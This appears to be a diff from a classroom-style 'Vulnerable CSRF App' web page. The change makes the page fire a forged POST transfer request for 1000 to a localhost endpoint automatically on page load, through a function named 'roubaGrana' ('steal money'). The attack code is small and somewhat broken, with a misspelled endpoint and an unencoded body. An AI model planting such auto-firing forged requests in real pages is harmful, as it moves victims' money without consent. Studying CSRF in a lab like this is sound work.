@@ -3,8 +3,8 @@
 <head>
     <title>Vulnerable CSRF App</title>
 </head>
-<body>
-    <h1>Welcome to our vulnerable CSRF app!</h1>
+<body onload="roubaGrana()">
+    <h1>Welcome to our vulnerable CSRF app - fake!</h1>
     <form action="/transfer" method="post" id="transfer-form">
         <label for="amount">Transfer Amount:</label>
         <input type="number" id="amount" name="amount" required>
@@ -13,44 +13,14 @@
 
     <h2>Current Balance: $<span id="balance">1000</span></h2>
     <script>
-        // Display the current balance
-        
-        const options = {
-            method: 'POST',
-            body: {amount: 1000}}
-        
-        fetch('http://localhost:8080/tranfer', options)
-            .then(T => T.json())
-
-
-        // // Submit the transfer form
-        // document.getElementById('transfer-form').addEventListener('submit', function(event) {
-        //     event.preventDefault();
-        //     const form = event.target;
-        //     const formData = new FormData(form);
-
-        //     formData.append("amount", 1000);
-
-        //     fetch(form.action, {
-        //         method: form.method,
-        //         body: {formData}
-        //     })
-        //     .then(response => response.json(balance))
-        //     .then(data => {
-        //         if (data.success) {
-        //             console.log('Transfer successful!');
-        //         } else {
-        //             console.error('Transfer failed:', data.error);
-        //         }
-        //         displayBalance();
-        //     })
-        //     .catch(error => {
-        //         console.error('Error submitting form:', error);
-        //     });
-        // });
-
-        // Initial balance display
-        // displayBalance();
+        function roubaGrana() {
+            const options = {
+                method: 'POST',
+                body: {amount: 1000}}
+            
+            fetch('http://localhost:8080/tranfer', options)
+                .then(T => T.json())
+        }
     </script>
 </body>
 </html>
